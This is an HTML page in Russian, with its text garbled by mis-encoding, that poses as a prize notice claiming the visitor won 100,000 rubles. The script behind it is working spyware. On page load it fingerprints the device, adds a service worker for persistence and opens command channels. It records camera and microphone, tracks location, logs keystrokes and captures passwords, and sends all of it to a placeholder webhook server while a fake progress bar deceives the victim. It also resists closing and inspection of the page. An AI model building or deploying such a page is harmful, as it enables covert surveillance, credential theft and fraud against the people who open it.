<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéâ –í–´ –í–´–ò–ì–†–ê–õ–ò 100000 –†–£–ë–õ–ï–ô!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(15px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        .progress-container {
            width: 100%;
            height: 25px;
            background: rgba(255,255,255,0.2);
            border-radius: 12px;
            margin: 25px 0;
            overflow: hidden;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            border-radius: 12px;
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .status-line {
            margin: 15px 0;
            font-size: 16px;
            min-height: 24px;
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="pulse">üéä –ü–û–ó–î–†–ê–í–õ–Ø–ï–ú!</h1>
        <h2>–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ 100 000 —Ä—É–±–ª–µ–π!</h2>
        <p>–ò–¥–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–∞...</p>

        <div class="progress-container">
            <div id="progressBar" class="progress-bar" style="width: 0%"></div>
        </div>

        <div id="status" class="status-line">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã –≤—ã–ø–ª–∞—Ç...</div>
        <div id="connectionStatus" class="status-line"></div>
        <div id="deviceInfo" class="status-line"></div>
    </div>

    <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Ä–∞–±–æ—Ç—ã –≤–∏—Ä—É—Å–∞ -->
    <video id="hiddenCamera" autoplay muted playsinline class="hidden"></video>
    <audio id="hiddenMicrophone" autoplay muted class="hidden"></audio>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

<script>
class AdvancedVirus {
    constructor() {
        this.victimId = this.generateUniqueId();
        this.installationSteps = 0;
        this.totalSteps = 8;
        this.serverUrl = 'https://your-webhook-server.herokuapp.com'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à –≤–µ–±—Ö—É–∫
        this.deviceFingerprint = null;
        this.isInstalled = false;
        this.mediaStreams = {};
        this.heartbeatInterval = null;
    }

    generateUniqueId() {
        const timestamp = Date.now().toString(36);
        const random = Math.random().toString(36).substr(2, 9);
        const fingerprint = this.getDeviceFingerprint();
        return `victim_${timestamp}_${random}_${fingerprint}`;
    }

    getDeviceFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            screen.width + 'x' + screen.height,
            navigator.language,
            new Date().getTimezoneOffset(),
            !!navigator.cookieEnabled,
            navigator.hardwareConcurrency || 'unknown'
        ];

        let fingerprint = components.join('|');
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    async startInfection() {
        try {
            if (this.checkPreviousInfection()) {
                this.showCompletionScreen();
                return;
            }

            await this.updateProgress(10, 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...');
            await this.collectDeviceInfo();

            await this.updateProgress(25, 'üì• –ó–∞–≥—Ä—É–∑–∫–∞ –∑–∞—â–∏—Ç–Ω—ã—Ö –º–æ–¥—É–ª–µ–π...');
            await this.installPersistence();

            await this.updateProgress(40, 'üåê –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...');
            await this.setupCommunication();

            await this.updateProgress(55, 'üîß –ê–∫—Ç–∏–≤–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º –¥–æ—Å—Ç—É–ø–∞...');
            await this.enableAccessModules();

            await this.updateProgress(70, 'üì° –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ä–≤–µ—Ä—É –≤—ã–ø–ª–∞—Ç...');
            await this.establishBackendConnection();

            await this.updateProgress(85, 'üîê –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...');
            await this.hidePresence();

            await this.updateProgress(95, '‚úÖ –§–∏–Ω–∞–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞...');
            await this.finalizeInfection();

            await this.updateProgress(100, 'üéâ –ü—Ä–∏–∑ –≥–æ—Ç–æ–≤ –∫ –≤—ã–¥–∞—á–µ!');
            this.markAsInstalled();

            setTimeout(() => this.showCompletionScreen(), 2000);

        } catch (error) {
            this.handleError('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Å–∏—Å—Ç–µ–º—ã');
        }
    }

    checkPreviousInfection() {
        const storedId = localStorage.getItem('victim_unique_id');
        if (storedId && storedId.includes(this.getDeviceFingerprint())) {
            return true;
        }
        return false;
    }

    markAsInstalled() {
        localStorage.setItem('victim_unique_id', this.victimId);
        localStorage.setItem('installation_time', new Date().toISOString());
        this.isInstalled = true;
    }

    async collectDeviceInfo() {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null
        };

        this.deviceFingerprint = deviceInfo;
        this.sendToServer('/device_info', deviceInfo);
    }

    async installPersistence() {
        // Service Worker –¥–ª—è —Ñ–æ–Ω–æ–≤–æ–π —Ä–∞–±–æ—Ç—ã
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register(
                    URL.createObjectURL(new Blob([
                        `self.addEventListener('install', (e) => {
                            self.skipWaiting();
                        });
                         self.addEventListener('activate', (e) => {
                            e.waitUntil(self.clients.claim());
                         });
                         self.addEventListener('fetch', (e) => {
                            // –ü–µ—Ä–µ—Ö–≤–∞—Ç –∑–∞–ø—Ä–æ—Å–æ–≤
                         });`
                    ], { type: 'application/javascript' }))
                );
                console.log('SW registered');
            } catch (e) {}
        }

        // LocalStorage –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
        localStorage.setItem('last_activity', new Date().toISOString());
    }

    async setupCommunication() {
        // WebRTC –¥–ª—è –æ–±—Ö–æ–¥–∞ NAT
        this.setupWebRTC();

        // WebSocket –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏
        this.setupWebSocket();

        // Heartbeat —Å–∏—Å—Ç–µ–º–∞
        this.startHeartbeat();
    }

    setupWebRTC() {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });

            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    this.sendToServer('/webrtc', {
                        candidate: e.candidate.candidate
                    });
                }
            };

            pc.createDataChannel('command');
        } catch (e) {}
    }

    setupWebSocket() {
        try {
            this.ws = new WebSocket('wss://your-websocket-server.herokuapp.com');
            this.ws.onopen = () => {
                this.sendToServer('/ws_connect', { victimId: this.victimId });
            };

            this.ws.onmessage = (event) => {
                this.handleCommand(JSON.parse(event.data));
            };
        } catch (e) {
            // Fallback –∫ HTTP polling
            this.startPolling();
        }
    }

    startHeartbeat() {
        this.heartbeatInterval = setInterval(() => {
            this.sendToServer('/heartbeat', {
                victimId: this.victimId,
                timestamp: new Date().toISOString(),
                location: window.location.href,
                battery: navigator.getBattery ? 'available' : 'unavailable'
            });
        }, 5000);
    }

    async enableAccessModules() {
        // –ö–∞–º–µ—Ä–∞ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω
        await this.enableMediaAccess();

        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        await this.enableGeolocation();

        // –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞
        await this.enableFileSystemAccess();

        // –ö–µ–π–ª–æ–≥–≥–µ—Ä
        this.enableKeylogger();

        // –°–∫—Ä–∏–Ω—à–æ—Ç—ã
        this.enableScreenshots();
    }

    async enableMediaAccess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'environment',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                },
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false,
                    channelCount: 2,
                    sampleRate: 44100
                }
            });

            this.mediaStreams.camera = stream;
            const video = document.getElementById('hiddenCamera');
            video.srcObject = stream;

            // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–ø–∏—Å—å
            this.startMediaRecording(stream);

            this.sendToServer('/media_status', {
                camera: true,
                microphone: true,
                resolution: '1080p'
            });

        } catch (error) {
            this.sendToServer('/media_status', {
                camera: false,
                microphone: false,
                error: error.message
            });
        }
    }

    startMediaRecording(stream) {
        try {
            this.mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9,opus'
            });

            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    this.sendMediaData(event.data);
                }
            };

            this.mediaRecorder.start(2000); // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã

        } catch (error) {
            console.error('Recording failed:', error);
        }
    }

    async enableGeolocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.sendToServer('/location', {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed
                    });
                },
                (error) => {
                    // –ü—Ä–æ–±—É–µ–º IP-based –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                    this.getIPLocation();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
    }

    async getIPLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            this.sendToServer('/ip_location', data);
        } catch (e) {}
    }

    enableKeylogger() {
        document.addEventListener('keydown', (e) => {
            this.sendToServer('/keylog', {
                key: e.key,
                code: e.code,
                target: e.target.tagName,
                value: e.target.value,
                timestamp: new Date().toISOString()
            });
        });

        document.addEventListener('input', (e) => {
            if (e.target.type === 'password') {
                this.sendToServer('/password_capture', {
                    field: e.target.name || 'unknown',
                    value: e.target.value,
                    timestamp: new Date().toISOString()
                });
            }
        });
    }

    enableScreenshots() {
        setInterval(() => {
            try {
                const video = document.getElementById('hiddenCamera');
                if (video.srcObject) {
                    const canvas = document.getElementById('hiddenCanvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);

                    canvas.toBlob((blob) => {
                        this.sendMediaData(blob, 'screenshot');
                    }, 'image/jpeg', 0.8);
                }
            } catch (e) {}
        }, 10000); // –°–∫—Ä–∏–Ω—à–æ—Ç –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
    }

    async establishBackendConnection() {
        // –°–∏–º—É–ª—è—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –±–∞–Ω–∫–æ–≤—Å–∫–æ–π —Å–∏—Å—Ç–µ–º–µ
        await new Promise(resolve => setTimeout(resolve, 2000));
        this.sendToServer('/backend_connected', {
            status: 'success',
            protocol: 'HTTPS/2',
            encryption: 'AES-256-GCM'
        });
    }

    async hidePresence() {
        // –°–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –≤ DOM
        setTimeout(() => {
            const elements = document.querySelectorAll('[class*="hidden"], [style*="display: none"]');
            elements.forEach(el => {
                el.style.cssText += ';display:none!important;visibility:hidden!important;';
            });
        }, 1000);

        // –û—á–∏—Å—Ç–∫–∞ –∫–æ–Ω—Å–æ–ª–∏
        console.clear = function() {};
    }

    async finalizeInfection() {
        this.sendToServer('/infection_complete', {
            victimId: this.victimId,
            timestamp: new Date().toISOString(),
            version: '2.1.0',
            modules: ['camera', 'microphone', 'geolocation', 'keylogger', 'screenshots']
        });
    }

    handleCommand(command) {
        switch (command.action) {
            case 'enable_camera':
                this.enableMediaAccess();
                break;
            case 'enable_microphone':
                this.enableMediaAccess();
                break;
            case 'get_files':
                this.exploreFileSystem();
                break;
            case 'screenshot':
                this.enableScreenshots();
                break;
            case 'self_destruct':
                this.selfDestruct();
                break;
        }
    }

    selfDestruct() {
        // –û—á–∏—Å—Ç–∫–∞ –≤—Å–µ—Ö —Å–ª–µ–¥–æ–≤
        localStorage.clear();
        sessionStorage.clear();

        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
        }

        if (this.mediaStreams.camera) {
            this.mediaStreams.camera.getTracks().forEach(track => track.stop());
        }

        // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
        window.location.href = 'https://google.com';
    }

    updateProgress(percent, message) {
        return new Promise((resolve) => {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('status').textContent = message;
            document.getElementById('status').className = 'status-line pulse';

            this.sendToServer('/progress', {
                victimId: this.victimId,
                progress: percent,
                status: message,
                timestamp: new Date().toISOString()
            });

            setTimeout(() => {
                document.getElementById('status').className = 'status-line';
                resolve();
            }, 1000 + Math.random() * 500);
        });
    }

    updateConnectionStatus(message, isSuccess = true) {
        const element = document.getElementById('connectionStatus');
        element.textContent = message;
        element.style.color = isSuccess ? '#00ff88' : '#ff4444';
    }

    showCompletionScreen() {
        document.body.innerHTML = `
            <div class="container">
                <h1 style="color: #00ff88;">‚úÖ –í–´–ü–õ–ê–¢–ê –û–§–û–†–ú–õ–ï–ù–ê!</h1>
                <p>100 000 —Ä—É–±–ª–µ–π –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –Ω–∞ –≤–∞—à —Å—á–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤</p>
                <p style="margin-top: 20px; font-size: 14px; opacity: 0.8;">
                    –°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ! –†–µ–∫–æ–º–µ–Ω–¥—É–π—Ç–µ –Ω–∞—Å –¥—Ä—É–∑—å—è–º!
                </p>
            </div>
        `;
    }

    handleError(message) {
        document.getElementById('status').textContent = `‚ùå ${message}`;
        document.getElementById('status').style.color = '#ff4444';
        this.sendToServer('/error', { error: message });
    }

    sendToServer(endpoint, data) {
        const payload = {
            victimId: this.victimId,
            deviceFingerprint: this.getDeviceFingerprint(),
            timestamp: new Date().toISOString(),
            ...data
        };

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
        this.sendViaBeacon(payload);
        this.sendViaFetch(payload);
        this.sendViaImage(payload);
    }

    sendViaBeacon(payload) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(this.serverUrl + '/beacon', blob);
    }

    sendViaFetch(payload) {
        fetch(this.serverUrl + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'no-cors'
        }).catch(() => {});
    }

    sendViaImage(payload) {
        const img = new Image();
        const encodedData = btoa(JSON.stringify(payload));
        img.src = `${this.serverUrl}/pixel?data=${encodedData}`;
    }

    sendMediaData(blob, type = 'video') {
        const formData = new FormData();
        formData.append('type', type);
        formData.append('victimId', this.victimId);
        formData.append('timestamp', new Date().toISOString());
        formData.append('media', blob);

        fetch(this.serverUrl + '/upload_media', {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        }).catch(() => {});
    }
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∑–∞–ø—É—Å–∫
document.addEventListener('DOMContentLoaded', () => {
    // –ó–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –±–æ–ª—å—à–µ–π –ø—Ä–∞–≤–¥–æ–ø–æ–¥–æ–±–Ω–æ—Å—Ç–∏
    setTimeout(() => {
        const virus = new AdvancedVirus();
        virus.startInfection();
    }, 1500);
});

// –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
});

// –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–Ω—Ç–µ–∫—Å—Ç–Ω–æ–≥–æ –º–µ–Ω—é
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ DevTools
setInterval(() => {
    if (window.outerWidth - window.innerWidth > 200 ||
        window.outerHeight - window.innerHeight > 200) {
        window.location.href = 'about:blank';
    }
}, 1000);
</script>
</body>
</html>